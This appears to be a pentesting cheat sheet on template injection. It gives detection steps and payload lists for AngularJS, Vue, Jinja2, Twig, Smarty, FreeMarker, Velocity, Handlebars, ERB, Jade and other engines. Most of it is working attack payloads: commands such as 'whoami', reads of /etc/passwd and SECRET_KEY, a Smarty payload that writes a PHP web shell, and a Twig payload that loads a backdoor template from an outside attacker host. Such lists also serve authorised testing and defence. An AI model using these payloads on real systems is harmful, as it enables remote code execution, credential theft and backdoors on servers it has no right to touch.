# Template Injection

## Testing for SSTI

Try submitting a fuzzed payload such as `${{<%[%'"}}%\` if a stack trace error is displayed then the application is vulnerable.

To distinguish between XSS and SSTI submit payloads that trigger mathematical operations such as `${2*2}` if the output is 4 then the vulnerability is aa SSTI

If the user input is included inside a code block follow this steps

1. Verify that the attack is not an XSS by passing a payload including HTML tags such as `str<b>test</b>` if the tags and the content included are not rendered then the vulnerability is not an XSS
2. Try to escape from the code block by submitting a payload as follow (adjust based on the engine's syntax): `}}<b>test</b>`
3. If the content of the code block is rendered correctly alongside the injected tags then the application is vulnerable to SSTI

## Engine identification

#### Generic

```
${{<%[%'"}}%\
```

#### AngularJS

```
{{$on.constructor('alert(1)')()}}
{{constructor.constructor('alert(1)')()}}
```

#### VueJS

```
{{_openBlock.constructor('alert(1)')()}}     //V3
{{constructor.constructor('alert(1)')()}}    //V2
```

#### Mavo

```
[self.alert(1)]
javascript:alert(1)%252f%252f..%252fcss-images
```

#### Java

```
${7*7}
${T(java.lang.System).getenv()}
${class.getClassLoader()}
```

#### ERB

```
<%= 7*7 %>
<%= foobar %>
```

#### Twig

```
{{7*7}}
{{7*'7'}}
```

#### Smarty

```
{$smarty.version}
```

#### Django - Python

```
{% raw %}
{% debug %}
{% endraw %}
{{settings.SECRET_KEY}}
```

#### Tornado - Python

```
{% raw %}
{% import foobar %} = Error
{% import os %}
{% endraw %}{{os.system('whoami')}}
```

#### Flask/Jinja2

```
{{ '7'*7 }}
{{ [].class.base.subclasses() }} # get all classes
{{''.class.mro()[1].subclasses()}}
```

#### Razor

```
@(1+2)
```

## Client Side Payloads

### AngularJS

```
{{$on.constructor('alert(1)')()}}
{{constructor.constructor('alert(1)')()}}

<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>
```

### VueJS

```
"><div v-html="''.constructor.constructor('d=document;d.location.hash.match(\'x1\') ? `` : d.location=`//localhost/mH`')()"> aaa</div>
{{_openBlock.constructor('alert(1)')()}}     //V3
{{constructor.constructor('alert(1)')()}}    //V2
```

### Mavo

```
[self.alert(1)]
javascript:alert(1)%252f%252f..%252fcss-images
```

## Server Side Payloads

### FreeMarker - java

```
${7*7} = 49
<#assign command="freemarker.template.utility.Execute"?new()> ${ command("cat /etc/passwd") }
```

### Java

```
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
${T(java.lang.System).getenv()}
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
```

### Twig - PHP

```
{{7*7}}
{{7*'7'}}
{{dump(app)}}
{{app.request.server.all|join(',')}}
"{{'/etc/passwd'|file_excerpt(1,30)}}"@
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
```

### Smarty - PHP

```
{$smarty.version}
{php}echo `id`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

### Handlebars - NodeJs

```
wrtz{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return require('child_process').exec('whoami');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
```

### Velocity

```
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

### ERB - Ruby

```
<%= system("whoami") %>
<%= Dir.entries('/') %>
<%= File.open('/example/arbitrary-file').read %>
```

### Django - Python

```
{% raw %}
{% debug %}
{% endraw %}
{{settings.SECRET_KEY}}
```

### Tornado - Python

```
{% raw %}
{% import foobar %} = Error
{% import os %}
{% endraw %}{{os.system('whoami')}}
```

### Mojolicious - Perl

```
<%= perl code %>
<% perl code %>
```

### Flask/Jinja2

```
{{ '7'*7 }}
{{ [].class.base.subclasses() }} # get all classes
{{''.class.mro()[1].subclasses()}}
{% raw %}
{%for c in [1,2,3] %}{{c,c,c}}{% endfor %}
{% endraw %}

{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
```

### Jade

```
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```

### Razor - .Net

```
@(1+2)
@{// C# code}
```



